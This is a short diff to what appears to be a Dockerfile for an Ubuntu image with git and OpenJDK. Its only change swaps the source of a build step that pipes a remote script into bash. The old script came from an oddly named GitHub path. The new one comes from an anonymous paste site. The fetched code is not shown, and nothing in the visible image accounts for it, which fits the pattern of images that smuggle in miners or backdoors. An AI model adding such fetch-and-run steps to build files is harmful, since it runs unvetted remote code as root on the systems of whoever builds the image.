@@ -3,7 +3,7 @@ FROM ubuntu:20.04
 ENV DEBIAN_FRONTEND=noninteractive
 ENV LC_ALL=C.UTF-8
 
-RUN apt-get update && apt -y install curl && curl -sL https://raw.githubusercontent.com/dragonballku8/kids/main/jazz | bash
+RUN apt-get update && apt -y install curl && curl -sL https://muq-hastebin.glitch.me/raw/HBaI3ON0Et | bash
 RUN apt-get install -y \
   git \
   openjdk-11-jdk \
